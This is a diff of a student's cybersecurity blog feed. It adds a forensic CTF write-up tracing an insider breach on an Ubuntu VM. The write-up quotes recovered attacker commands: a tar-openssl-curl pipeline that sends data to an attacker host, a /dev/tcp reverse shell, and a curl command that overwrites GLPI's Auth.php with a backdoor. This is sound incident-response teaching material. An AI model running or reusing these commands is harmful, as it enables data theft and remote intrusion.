@@ -1,5 +1,226 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-12-23T22:12:16+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jay’s Cybersecurity Notes</title><subtitle>A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
-</subtitle><author><name>Jaysen</name></author><entry><title type="html">Operation Pensieve Breach - heroCTF v7</title><link href="http://localhost:4000/heroctfv7-full-forensics/" rel="alternate" type="text/html" title="Operation Pensieve Breach - heroCTF v7" /><published>2025-12-23T00:00:00+07:00</published><updated>2025-12-23T00:00:00+07:00</updated><id>http://localhost:4000/heroctfv7-full-forensics</id><content type="html" xml:base="http://localhost:4000/heroctfv7-full-forensics/"><![CDATA[<p>About a month ago, I participated in heroCTF v7 with my team, CSUI, where we finished 9th overall and successfully solved all forensic challenges. I personally worked on most of the forensic challanges throughout the competition.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-17T14:55:33+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Jay’s Cybersecurity Notes</title><subtitle>A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
+</subtitle><author><name>Jaysen</name></author><entry><title type="html">Unorthodox Part 1 – Cyber Jawara Qual 2025</title><link href="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/" rel="alternate" type="text/html" title="Unorthodox Part 1 – Cyber Jawara Qual 2025" /><published>2026-01-17T00:00:00+07:00</published><updated>2026-01-17T00:00:00+07:00</updated><id>http://localhost:4000/CyberJawara2025-Unorthodox%20Part%201</id><content type="html" xml:base="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/"><![CDATA[<p>On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.</p>
+
+<p>Unorthodox – Part 1 stood out as a particularly interesting challenge due to its realistic investigation flow, especially in the later stage where the attacker leveraged <strong>less common persistence techniques</strong>. Instead of relying on obvious indicators of compromise, the challenge required careful review of package installation logs and extended file attributes to uncover a stealthy payload hidden using <strong>xattr</strong>, which was planted months before the actual data exfiltration took place.</p>
+
+<p>In this post, I will present a complete forensic write-up of the challenge, detailing each step of the investigation — from mounting the compromised virtual machine and validating credential integrity, to uncovering hidden persistence mechanisms, decrypting exfiltrated data, and identifying multiple internal threat actors operating within the environment.</p>
+
+<p>You can access the challange attachments <a href="https://github.com/sksd-id/CJ2025-public/tree/main/quals/umum/Forensics/Unorthodox%20Part%201">here</a></p>
+
+<h2 id="unorthodox-part-1">Unorthodox Part 1</h2>
+
+<h3 id="attachment">Attachment</h3>
+<ul>
+  <li>artifact.zip</li>
+</ul>
+
+<h3 id="description">Description</h3>
+<p>Our client has suffered a critical internal breach. All the details can be found in CJ-UNORTHODOX-CASE-1.pdf file. You need to answer all the tasks correctly in the remote connection. There are 8 Questions for you to answer. All of the necessary artifacts including the document can be downloaded from the following zip file: https://drive.google.com/file/d/1rJk2hWxTV8jGLkAOdKPGAyBHPxNB67a2/view?usp=sharing 
+Zip password = CJ2025{65e8d2d5563d202ff4d6269e08748f9e24854eb6374670851fe1542ebecf739c}</p>
+
+<p>NOTE: The malicious artifact doesn’t encrypt/modify your files, don’t worry. You can trust me ^-^ Start challenge from: https://gzcli.ctf.cyberjawara.id/umum-quals-forensics-unorthodox-part-1</p>
+
+<h3 id="initial-case-analysis">Initial Case Analysis</h3>
+<p>This case provided four files :</p>
+<ul>
+  <li>CJ-UNORTHODOX-CASE-1.pdf</li>
+  <li>PCAP_Captured.pcap</li>
+  <li>CoreStock.ova</li>
+  <li>exfiltrated.bin</li>
+</ul>
+
+<p>From the PDF, we learn that the attacker caused three main impacts:</p>
+<ol>
+  <li>All recent stock macro-analysis data was deleted</li>
+  <li>All user login credentials were changed</li>
+  <li>The server may have been compromised by multiple internal threat actors</li>
+</ol>
+
+<p>Since the virtual machine might still contain useful evidence, I started by analyzing the <code class="language-plaintext highlighter-rouge">CoreStock.ova</code> file.</p>
+
+<h3 id="mounting-the-compromised-virtual-machine">Mounting the Compromised Virtual Machine</h3>
+<p>An OVA is basically a packaged virtual machine, so I extracted it and obtained the main disk file: <code class="language-plaintext highlighter-rouge">CoreStock-disk002.vmdk</code>. To mount this VMDK and access the filesystem, I followed the method described <a href="https://jasonmurray.org/posts/2021/mountvmdk/">here</a>.</p>
+<ol>
+  <li>Load the NBD kernel module
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>modprobe nbd <span class="nv">max_part</span><span class="o">=</span>8
+</code></pre></div>    </div>
+  </li>
+  <li>Attach the VMDK to /dev/nbd0 (read-only)
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>qemu-nbd <span class="nt">--read-only</span> <span class="nt">--connect</span><span class="o">=</span>/dev/nbd0 CoreStock-disk002.vmdk
+</code></pre></div>    </div>
+  </li>
+  <li>Check the partition layout
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>fdisk <span class="nt">-l</span> /dev/nbd0
+</code></pre></div>    </div>
+    <p><img src="/assets/CJ-Qual/1.png" alt="alt text" />
+From this output I identified:</p>
+    <ul>
+      <li>/dev/nbd0p2 → ext4 partition (~2GB) → this is the /boot partition</li>
+      <li>/dev/nbd0p3 → LVM physical volume (~23GB) → this contains the main OS filesystem
+So the actual Linux system is stored inside LVM on partition p3.</li>
+    </ul>
+  </li>
+  <li>Detect and activate the LVM volumes
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pvscan
+<span class="nb">sudo </span>vgscan
+<span class="nb">sudo </span>vgchange <span class="nt">-ay</span>
+<span class="nb">sudo </span>lvs
+</code></pre></div>    </div>
+    <p>This revealed a logical volume: /dev/ubuntu-vg/ubuntu-lv</p>
+  </li>
+  <li>Mount the root filesystem (read-only)
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> ro,noload /dev/ubuntu-vg/ubuntu-lv /mnt/un
+</code></pre></div>    </div>
+    <p>Using ro,noload ensures the filesystem journal is not replayed, so nothing on disk is modified. At this point, the full Linux filesystem became accessible at: /mnt/un	
+<img src="/assets/CJ-Qual/2.png" alt="alt text" /></p>
+  </li>
+</ol>
+
+<h3 id="question-and-analysis">Question and Analysis</h3>
+<p>Now we move on to the question.</p>
+<ol>
+  <li>Provide the current state SHA1 checksum of /etc/passwd and /etc/shadow files respectively.
+Format: hexpasswd:hexshadow (e.g., 01cde86aeee1f8e73f969bb34b8e0102b54f22f4:80514ef77a78c1edb97cf51a205627b2d6ec679d)
+We calculated the SHA1 checksum of both files directly from the mounted filesystem:
+<img src="/assets/CJ-Qual/3.png" alt="alt text" /></li>
+</ol>
+
+<p>Answer : 
+<code class="language-plaintext highlighter-rouge">b4e536869564e1b32dfd60ea90bc45227a289c3c:e9b3129a2209be30fb0ba6ceb61e5c0ee4e47c70</code></p>
+
+<ol>
+  <li>What’s the IP address of the internal threat actor (local) who’s responsible to exfiltrate a certain data to their controlled website/API endpoint? 
+Format: ipv4.ipv4.ipv4.ipv4 (e.g., 172.16.1.78)
+We analyzed the provided packet capture and inspected HTTP traffic. One suspicious HTTP POST request contained:
+    <ul>
+      <li>User-Agent: curl</li>
+      <li>Message Body: Berhasil :p</li>
+    </ul>
+  </li>
+</ol>
+
+<p>This strongly suggested command-line exfiltration activity.
+<img src="/assets/CJ-Qual/5.png" alt="alt text" /></p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">192.168.100.107</code></p>
+
+<ol>
+  <li>What’s the path of the attacker controlled endpoint that receives the data? Note that the data doesn’t exist in the packet capture, but we’ve dissected and extracted it to the exfiltrated.bin file.
+Format: /path (e.g., /exfiltratedapi)
+A malicious script was discovered at: /home/cj/.ssh/rc.</li>
+</ol>
+
+<p>When opening the file, it did not immediately show readable code. Instead, it contained Base64-encoded and obfuscated shell syntax, for example:
+<img src="/assets/CJ-Qual/6.png" alt="alt text" />
+Breaking down the obfuscation :</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Obfuscated Part</th>
+      <th>Explanation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">$'\u0073'</code></td>
+      <td>Unicode escape sequence representing the character <code class="language-plaintext highlighter-rouge">s</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ba$'\u0073h'</code></td>
+      <td>Reconstructed at runtime to form the string <code class="language-plaintext highlighter-rouge">bash</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">${@,}</code> &amp; <code class="language-plaintext highlighter-rouge">${@%%…}</code></td>
+      <td>Dummy parameter expansions used to confuse analysis</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">&lt;&lt;&lt;</code></td>
+      <td>Here-string redirection for inline input</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>So we know : it run bash and feeds decoded base64 into it. To inspect the actual malicious command safely,
+we replaced the execution part with cat instead of bash
+<img src="/assets/CJ-Qual/7.png" alt="alt text" />
+<img src="/assets/CJ-Qual/8.png" alt="alt text" />
+This revealed the FULL malicious script:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Haha your server is already pwned by Joko_S3mbunG."</span> |  <span class="nb">tar</span> <span class="nt">-czf</span> - <span class="nt">-C</span> /home/cj/core_app <span class="nb">.</span> | openssl enc <span class="nt">-aes-256-cbc</span> <span class="nt">-salt</span> <span class="nt">-pbkdf2</span> <span class="nt">-k</span> <span class="s1">'Ch4LLG48uT_h3h3!'</span> | curl <span class="nt">-X</span> POST <span class="nt">--data-binary</span> @- http://192.168.100.107/looters <span class="o">&amp;&amp;</span> <span class="nb">history</span> <span class="nt">-c</span>
+</code></pre></div></div>
+<p>So, we know that the data flow is : 
+/home/cj/core_app  -&gt;  tar  -&gt;  openssl encryption  -&gt;  curl POST  -&gt;  attacker server</p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">looters</code></p>
+
+<ol>
+  <li>What’s the full absolute path of the targeted directory that the internal threat actor exfiltrates from?
+Format: /absolute/path (e.g., /opt/secret)</li>
+</ol>
+
+<p>From the malicious script we recovered in /home/cj/.ssh/rc. We previously decoded the payload and discovered the following command chain: tar -czf - -C /home/cj/core_app .</p>
+
+<p>Answer: <code class="language-plaintext highlighter-rouge">/home/cj/core_app</code></p>
+
+<ol>
+  <li>Where is the malicious exfiltrator script located? Please provide the full absolute path!
+During inspection of the compromised user account directory /home/cj/.ssh, we discovered rc, the file contains malicious encoded payload.</li>
+</ol>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">/home/cj/.ssh/rc</code></p>
+
+<ol>
+  <li>It looks like the exfiltrated directory files were all being shredded. Please provide the original metadata title of the web application (in layout.tsx file), the total of the stock sectors and the total of the companies!
+Format: Title Web App Name_totalstocksectors_totalcompanies (e.g., Cool Stock Website 2024 - Galapagos Stock_8_91)
+First, we extracting the exfiltrated encrypted payload and decrypting using the attacker’s AES key : Ch4LLG48uT_h3h3! and than extracting the web app source code
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-czf</span> - <span class="nt">-C</span> /home/cj/core_app <span class="nb">.</span>
+| openssl enc <span class="nt">-aes-256-cbc</span> <span class="nt">-salt</span> <span class="nt">-pbkdf2</span> <span class="nt">-k</span> <span class="s1">'Ch4LLG48uT_h3h3!'</span>
+</code></pre></div>    </div>
+    <p>Inside /home/cj/core_app/company_secret/app/layout.tsx. We localted the metadata : 
+<img src="/assets/CJ-Qual/9.png" alt="alt text" />
+Counting Stock Sectors inside : lib/stock-data.ts
+<img src="/assets/CJ-Qual/10.png" alt="alt text" />
+total : 8</p>
+  </li>
+</ol>
+
+<p>Counting Company List inside the same file : 
+<img src="/assets/CJ-Qual/11.png" alt="alt text" />
+Total companies = 40</p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">Saham Bos 2025 - Stock Market Dashboard_8_40</code></p>
+
+<ol>
+  <li>
+    <p>Please provide the original state of all the stock codes for Technology Sector-based Stock Code!
+Format: STCK,STCK,STCK,STCK (e.g., NUMA,POCK,RAVA,LEMA)
+From the same file lib/stock-data.ts, we filtered companies where sector==”Technology” and resulted :
+<img src="/assets/CJ-Qual/11.png" alt="alt text" />
+Answer : TECH,DIGI,CHIP,CLOUD,ELECT,DATA</p>
+  </li>
+  <li>
+    <p>Upon the investigation, we sought another potential threat actor compromising the machine from the different IP but we didn’t see any plain IOC in the server. It looks like this threat actor was first seen in November before the exfiltration event occurs whereas there has been an unauthorized dependency/package installation in the server which we haven’t validated yet. Are you able to find another IP of the attacker and its payload in base64 form?
+Format: ipv4.ipv4.ipv4.ipv4_base64encodedpayload (e.g., 172.16.1.18_ZWNobyAnW3tob3N0czogMTkuMjEzLjQ1LjE2LCB0YXNrczogW3NoZWxsOiAvYmluL3NoIDwvZGV2L3R0eSA+L2Rldi90dHkgMj4vZGV2L3R0eV19XScgPiAkR0FMQUs7IGFuc2libGUtcGxheWJvb2sgJEdBTEFL)</p>
+  </li>
+</ol>
+
+<p>While reviewing persistence artifacts, I noted <strong>a suspicious package installation in November</strong>, prior to the data exfiltration event: /mnt/ubuntu/var/log/dpkg.log
+<img src="/assets/CJ-Qual/12.png" alt="alt text" />
+The attr package is used to manipulate extended file attributes — commonly abused for stealth payload storage. (https://isc.sans.edu/diary/32116)</p>
+
+<p>We scanned /home/cj for hidden xattr metadata and found a <strong>payload embedded</strong> in: /home/cj/frmstarter.script
+<img src="/assets/CJ-Qual/13.png" alt="alt text" />
+Decoded payload : sh -i &gt;&amp; /dev/tcp/192.168.100.137/8281 0&gt;&amp;1</p>
+
+<p>This proves Attacker IP = 192.168.100.137
+Answer : <code class="language-plaintext highlighter-rouge">192.168.100.137_c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMTM3LzgyODEgMD4mMQ==</code></p>
+
+<p><img src="/assets/CJ-Qual/15.png" alt="alt text" /></p>
+
+<p>FLAG : 
+<code class="language-plaintext highlighter-rouge">CJ2025{13bf2db2271d235e2c33dc98d45482b1242df9333402f3e02ca83a9def15ac4b}</code></p>
+
+<p>This investigation highlights the importance of going beyond obvious indicators and examining less common persistence vectors. Correlating disk, log, and network artifacts ultimately revealed the complete attacker workflow.</p>]]></content><author><name>Jaysen</name></author><category term="CTF" /><category term="Forensics" /><category term="DFIR" /><category term="DigitalForensics" /><category term="DiskForensics" /><category term="Linux" /><category term="xattr" /><category term="Persistence" /><category term="PCAP" /><summary type="html"><![CDATA[On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.]]></summary></entry><entry><title type="html">Operation Pensieve Breach - heroCTF v7</title><link href="http://localhost:4000/heroctfv7-full-forensics/" rel="alternate" type="text/html" title="Operation Pensieve Breach - heroCTF v7" /><published>2025-12-23T00:00:00+07:00</published><updated>2025-12-23T00:00:00+07:00</updated><id>http://localhost:4000/heroctfv7-full-forensics</id><content type="html" xml:base="http://localhost:4000/heroctfv7-full-forensics/"><![CDATA[<p>About a month ago, I participated in heroCTF v7 with my team, CSUI, where we finished 9th overall and successfully solved all forensic challenges. I personally worked on most of the forensic challanges throughout the competition.</p>
 
 <p>This challenge series is based on real-world engagements, including both penetration testing and red team operations, as stated by the challenge author. This realism is clearly reflected in the attack flow, which closely resembles an actual enterprise intrusion and requires a DFIR-style investigation rather than isolated exploitation steps.</p>
 
@@ -364,7 +585,7 @@ oGAHt/Kk1OKeXWxy7iXUfw==;
 <span class="o">[</span>2] curl https://xthaz.fr/glpi_auth_backdoored.php <span class="o">&gt;</span> /var/www/glpi/src/Auth.php
 <span class="o">[</span>3] <span class="nb">whoami</span>
 </code></pre></div></div>
-<p>Jadi dari sini sudah kelihatan bagaimana bisa terjadi backdoor yaitu attacker melakukan overwriting pada Auth.php</p>
+<p>This explains how the backdoor was planted, where the attacker overwrote the <code class="language-plaintext highlighter-rouge">Auth.php</code> file.</p>
 
 <h3 id="absolute-path-of-file-used-to-backdoor-auth">Absolute Path of File Used to Backdoor Auth</h3>
 <p>The decrypted commands clearly show how the backdoor was deployed:</p>
@@ -380,7 +601,7 @@ oGAHt/Kk1OKeXWxy7iXUfw==;
 <p>To further understand how the backdoor was registered, the glpi_plugins table needed to be analyzed.
 Since only a filesystem dump was provided, the database had to be recovered offline.</p>
 
-<p>The MariaDB version in use was identified from the mysql_upgrade_info file as 10.11.14-MariaDB.
+<p>The MariaDB version in use was identified from the <code class="language-plaintext highlighter-rouge">mysql_upgrade_info</code> file as 10.11.14-MariaDB.
 To ensure compatibility, a MariaDB container with a matching version was launched and the original data directory was mounted:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--rm</span> <span class="se">\</span>
@@ -872,4 +1093,4 @@ This strongly indicates that:</p>
 
 <p>This challenge was especially enjoyable due to how closely it mirrors a real-world DFIR investigation. Each stage required correlating evidence across multiple data sources, reinforcing the importance of methodical analysis over isolated exploitation techniques.</p>
 
-<p>Huge credit to the challenge author and the heroCTF team for designing this scenario.</p>]]></content><author><name>Jaysen</name></author><category term="CTF" /><category term="Forensics" /><category term="DFIR" /><category term="DigitalForensics" /><category term="ActiveDirectory" /><category term="DCsync" /><category term="GLPI" /><category term="BYOVD" /><summary type="html"><![CDATA[About a month ago, I participated in heroCTF v7 with my team, CSUI, where we finished 9th overall and successfully solved all forensic challenges. I personally worked on most of the forensic challanges throughout the competition.]]></summary></entry></feed>
+<p>Huge credit to the challenge author and the heroCTF team for designing this scenario.</p>]]></content><author><name>Jaysen</name></author><category term="CTF" /><category term="Forensics" /><category term="DFIR" /><category term="DigitalForensics" /><category term="ActiveDirectory" /><category term="DiskForensics" /><category term="MemoryForensics" /><category term="DCsync" /><category term="GLPI" /><category term="BYOVD" /><summary type="html"><![CDATA[About a month ago, I participated in heroCTF v7 with my team, CSUI, where we finished 9th overall and successfully solved all forensic challenges. I personally worked on most of the forensic challanges throughout the competition.]]></summary></entry></feed>
